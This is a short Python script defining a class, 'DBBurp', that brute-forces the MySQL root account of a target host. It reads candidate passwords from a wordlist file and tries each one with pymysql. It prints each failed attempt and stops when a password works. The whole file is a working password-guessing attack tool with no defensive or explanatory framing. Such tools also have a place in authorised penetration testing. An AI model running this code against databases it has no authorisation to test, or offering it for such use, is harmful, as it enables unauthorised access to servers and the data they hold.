import os
import os.path
import pymysql

class DBBurp(object):
    def __init__(self, target: str, file: str, port: int = 3306) -> None:
        self.target = target
        self.port = port
        self.file = file

    def is_exists(self) -> str:
        if not os.path.isfile(self.file):
            return ''

        if not os.access(self.file, os.R_OK):
            return ''

        if os.path.isfile(self.file) and os.access(self.file, os.R_OK):
            return self.file

        return ''

    def connection(self, target: str, port: int, passwd: str) -> int:
        code = 0
        try:
            conn = pymysql.connect(
                host=target,
                port=port,
                user='root',
                password=passwd,
                connect_timeout=3
            )
            conn.close()
        except pymysql.err.OperationalError:
            code = 1
        except Exception:
            code = 2
        return code

    def run(self) -> None:
        file = self.is_exists()
        if not file:
            print(f'[!] File {self.file} does not exist or is not readable')
            return

        with open(file) as fs:
            for item in fs.readlines():
                pwd = item.strip('\n')
                code = self.connection(self.target, self.port, pwd)
                if code == 0:
                    print(f'[+] Password found : {pwd}')
                    break
                elif code == 1:
                    print(f'[-] Failed password: {pwd}')
                else:
                    print(f'[!] Connection error -> {self.target}:{self.port}')
                    break
